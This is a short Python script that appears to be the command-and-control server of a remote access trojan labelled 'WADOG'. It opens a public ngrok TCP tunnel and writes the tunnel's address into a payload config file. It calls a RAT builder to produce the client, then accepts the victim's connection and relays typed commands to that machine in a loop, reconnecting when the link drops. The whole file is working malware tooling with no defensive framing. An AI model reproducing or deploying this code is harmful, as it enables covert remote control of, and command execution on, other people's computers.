import __future__
import socket 
import configparser
from buildRat import build
import configparser
from scriptconfig import ScriptConfig
from pyngrok import ngrok

#config socket server
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host="127.0.0.1"
port=8080

#config payload
ssh,ssh_port=ngrok.connect(port,proto="tcp").replace('tcp://','').split(":")
conf=configparser.ConfigParser()
confile=open('PAYLOAD.ini','w')
conf.add_section('HostSection')
conf.add_section('PortSection')
conf.set('HostSection','Host',ssh)
conf.set('PortSection','Port',ssh_port)
conf.write(confile)
confile.close()

#load script config
build(ScriptConfig())


#


server.bind((host,port))
server.listen(5)
client,addr=server.accept()
print("conection establishd",addr)
while True:
    try:
        command=input("$[WADOG]>>>")
        if command=='':
            print("Unkown command ?")
        else:
            client.send(command.encode("UTF-8"))
            msg=client.recv(2024)
            print(msg.decode("UTF-8"))
    except (ConnectionAbortedError,ConnectionResetError) as e:
        print(e)
        client,addr=server.accept()
        print("back to online!",addr)